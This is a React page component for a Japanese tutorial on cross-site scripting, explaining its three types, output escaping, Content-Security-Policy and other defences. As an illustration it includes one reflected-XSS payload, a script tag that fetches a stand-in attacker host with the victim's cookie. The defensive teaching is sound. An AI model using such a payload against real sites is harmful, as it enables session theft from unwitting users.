import { ArticleLayout } from "../../_components/ArticleLayout";
import { getArticle } from "@/lib/articles";

const article = getArticle("security", "xss")!;

export default function Page() {
  return (
    <ArticleLayout article={article}>
      <h2>XSS とは何か</h2>
      <p>
        <strong>XSS（Cross-Site Scripting）</strong>は、攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性です。被害者から見ると正規サイト内で動いているスクリプトに見えるため、Cookie の窃取、フォーム改ざん、なりすまし操作などあらゆる悪用に繋がります。
      </p>
      <p>
        OWASP Top 10 では <strong>A03:2021 Injection</strong> の中に分類される、Web アプリ脆弱性の最古参にして最頻出。「ユーザー入力をそのまま HTML に出力した」が根本原因のすべてです。
      </p>

      <h2>3つの種類</h2>
      <p>
        XSS は実行経路によって3種類に分けられます。防御策は基本的に同じですが、見つけ方と影響範囲が異なります。
      </p>
      <table>
        <thead>
          <tr>
            <th>種類</th>
            <th>経路</th>
            <th>典型例</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Reflected（反射型）</td>
            <td>URLパラメータがその場で反射</td>
            <td>検索結果ページのキーワード表示</td>
          </tr>
          <tr>
            <td>Stored（蓄積型）</td>
            <td>DB等に保存され他ユーザーへ配信</td>
            <td>掲示板のコメント、SNSの投稿</td>
          </tr>
          <tr>
            <td>DOM-based</td>
            <td>クライアント側 JS が DOM を書換える時点</td>
            <td><code>location.hash</code> を <code>innerHTML</code> へ代入</td>
          </tr>
        </tbody>
      </table>
      <p>
        Stored が最も影響範囲が広く（不特定多数を巻き込む）、Reflected はリンクを踏ませる必要がある分ハードルがあるが「正規ドメイン下で動く」点で同じく危険。DOM-based はサーバーログに残らないので発見が遅れがちです。
      </p>

      <h2>具体例で見る</h2>
      <p>
        ユーザー入力 <code>q</code> をそのまま埋め込むサーバーがあったとします：
      </p>
      <pre><code>{`<p>検索結果: \${q}</p>`}</code></pre>
      <p>
        攻撃者が <code>{'?q=<script>fetch(`https://evil/?c=${document.cookie}`)</script>'}</code> のような URL を被害者に踏ませると、被害者のブラウザで <code>document.cookie</code> が外部に送られます。Cookie に <code>HttpOnly</code> が無ければセッションがそのまま乗っ取られます。
      </p>

      <h2>防御の基本: 出力時エスケープ</h2>
      <p>
        XSS 対策の<strong>本丸は「HTML として出力する瞬間にエスケープすること」</strong>です。「入力時に弾く」ではありません（後述）。
      </p>
      <p>
        最低限エスケープすべき5文字（HTML 文脈の場合）：
      </p>
      <table>
        <thead>
          <tr>
            <th>文字</th>
            <th>エンティティ</th>
            <th>意味</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>&lt;</td>
            <td>&amp;lt;</td>
            <td>タグ開始の無効化</td>
          </tr>
          <tr>
            <td>&gt;</td>
            <td>&amp;gt;</td>
            <td>タグ終了の無効化</td>
          </tr>
          <tr>
            <td>&amp;</td>
            <td>&amp;amp;</td>
            <td>エンティティ起点の無効化</td>
          </tr>
          <tr>
            <td>"</td>
            <td>&amp;quot;</td>
            <td>属性値破壊の防止</td>
          </tr>
          <tr>
            <td>'</td>
            <td>&amp;#39;</td>
            <td>属性値破壊の防止（HTML5 で <code>&amp;apos;</code>）</td>
          </tr>
        </tbody>
      </table>
      <p>
        モダンなテンプレートエンジン（React の JSX、Vue、Svelte、Go の <code>html/template</code>、Django、ERB の <code>&lt;%=h %&gt;</code>）はデフォルトで自動エスケープします。<strong>「自動エスケープを無効化する API」を使うときだけ気をつける</strong>のが現代的な感覚です。
      </p>
      <ul>
        <li>React: <code>dangerouslySetInnerHTML</code></li>
        <li>Vue: <code>v-html</code></li>
        <li>jQuery: <code>.html()</code></li>
        <li>素の DOM: <code>element.innerHTML = ...</code></li>
      </ul>
      <blockquote>
        <p>
          ⚠ 文脈を間違えると意味がない: HTML 本文に対するエスケープは &lt;script&gt; タグ内や属性値内では別ルール。<code>{'<script>var x = "${q}"</script>'}</code> のような JS 文字列に値を埋め込む場面では <code>JSON.stringify</code> で囲うのが安全です。
        </p>
      </blockquote>

      <h2>多層防御: CSP（Content-Security-Policy）</h2>
      <p>
        エスケープが破れた時の最後の砦が <strong>CSP</strong> です。HTTP レスポンスヘッダで「このページから実行を許可するスクリプトの出所」をブラウザに宣言します。
      </p>
      <pre><code>{`Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-rAnd0m';
  object-src 'none';
  base-uri 'none'`}</code></pre>
      <p>
        ポイント：
      </p>
      <ul>
        <li><code>'unsafe-inline'</code> をスクリプトで許可しない（許可した瞬間 CSP の防御がほぼ消える）</li>
        <li>インラインスクリプトを使うなら <strong>nonce</strong> または <strong>hash</strong> を採用</li>
        <li><code>object-src 'none'</code> で Flash/PDF プラグイン経由の XSS を遮断</li>
        <li><code>base-uri 'none'</code> で <code>&lt;base&gt;</code> 改ざん攻撃を防止</li>
      </ul>

      <h2>その他の追加防御</h2>
      <ul>
        <li>
          <strong>Cookie に HttpOnly</strong>: <code>document.cookie</code> から読めなくなり、Cookie 窃取型 XSS を無力化
        </li>
        <li>
          <strong>X-Content-Type-Options: nosniff</strong>: ブラウザの MIME スニッフィングを止め、画像偽装スクリプトを防ぐ
        </li>
        <li>
          <strong>Trusted Types</strong>（モダンブラウザ）: <code>innerHTML</code> 等への代入を型レベルで強制チェック
        </li>
        <li>
          <strong>サニタイザライブラリ</strong>（DOMPurify など）: HTML を許可する必要がある場面（ブログのリッチエディタ等）で使う
        </li>
      </ul>

      <h2>よくある誤解</h2>
      <h3>誤解1: 入力をサニタイズすれば安全</h3>
      <p>
        「DBに入れる前に &lt; を消そう」は<strong>逆効果</strong>です。理由：
      </p>
      <ul>
        <li>入力時には出力先文脈（HTML本文 / 属性 / JS / URL）が分からないので適切にエスケープできない</li>
        <li>正規データ（コメントに <code>1 &lt; 2</code> と書きたい場合等）まで壊す</li>
        <li>サニタイズ漏れがあると後段で全部抜ける</li>
      </ul>
      <p>
        <strong>「入力は受け入れて、出力時にエスケープ」</strong>が正しい原則。
      </p>

      <h3>誤解2: HTTPS にすれば XSS も防げる</h3>
      <p>
        HTTPS は通信路の盗聴・改ざんを防ぐもので、XSS（アプリ層の脆弱性）とは独立。HTTPS 化は前提として必要ですが XSS 対策にはなりません。
      </p>

      <h3>誤解3: WAF を入れれば終わり</h3>
      <p>
        WAF（Web Application Firewall）はパターンマッチで疑わしいリクエストを弾きますが、新しい構文や難読化で簡単にバイパスされます。<strong>「アプリ側のエスケープ + 多層防御」が本筋</strong>で、WAF は時間稼ぎの位置づけ。
      </p>

      <h2>おわりに</h2>
      <p>
        XSS の根は単純で「文字列を文脈ごとにエスケープせず HTML に流し込んだ」だけです。モダンなフレームワークは自動エスケープしてくれるので、<strong>「自動エスケープを破る API を使うときに警戒する」</strong>習慣を身につけ、加えて CSP / HttpOnly / nosniff の多層防御を必ず入れる、というのが現代的な構え方です。
      </p>
      <p>
        本サイトの HTML Entity Encoder/Decoder では、最小エスケープ／名前付き／数値参照（10進・16進）の各レベルでどう変換されるか実機で確認できます。テンプレートエンジンの自動エスケープが内部で何をしているか、覗いてみてください。
      </p>
    </ArticleLayout>
  );
}
